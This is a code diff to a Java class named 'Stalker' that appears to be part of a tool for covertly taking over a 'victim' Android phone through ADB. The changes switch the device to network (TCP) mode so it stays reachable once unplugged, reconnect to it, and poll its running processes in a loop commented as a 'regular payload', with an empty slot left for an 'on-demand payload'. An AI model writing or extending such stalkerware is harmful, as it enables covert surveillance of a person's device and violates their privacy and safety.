@@ -3,13 +3,14 @@ package core;
 public class Stalker implements Runnable{
 	
 	private Adb adb;
-	String deviceID;
+	DeviceInfo device;
 	boolean victimConnected;
 	
-	public Stalker(String deviceID)
+	public Stalker(DeviceInfo device)
 	{
-		this.deviceID = deviceID;
-		adb = new Adb(deviceID);
+		this.device = device;
+		adb = new Adb(device);
+		victimConnected = true;
 	}
 
 
@@ -17,14 +18,31 @@ public class Stalker implements Runnable{
 	public void run() {
 		while (true)
 		{
-			isVictimConnected();
-			if (!victimConnected)
+			// 1. confirm the connectivity of victim
+			if (device.tcpID.equals(""))
+				device.tcpID = adb.getIPAddress()+":"+Adb.tcpPort;
+			device.usbConnected = DeviceMonitor.adbDevices.contains(device.usbID);
+			device.tcpConnected = DeviceMonitor.adbDevices.contains(device.tcpID);
+			if (!device.tcpConnected && !device.usbConnected)
 			{
+				victimConnected = false;
 				return;
 			}
-			System.out.println("Stalking " + adb.deviceID + "...");
-			adb.toTCPMode();
-			wait(2000);
+			if (!device.tcpConnected)
+				adb.connectTCP();
+			
+			// 2. regular payload
+			device.runningProcesses = P.read(adb.sendCmd("shell ps |grep ").getInputStream());
+			P.print(device.runningProcesses);
+			
+			
+			
+			// 3. on-demand payload
+
+			
+			
+			
+			wait(200);
 		}
 	}
 	
@@ -32,11 +50,7 @@ public class Stalker implements Runnable{
 	{
 		new Thread(this).start();
 	}
-	
-	public void isVictimConnected()
-	{
-		victimConnected = DeviceMonitor.currentDevices.contains(deviceID);
-	}
+
 	
 	private void wait(int milliseconds)
 	{
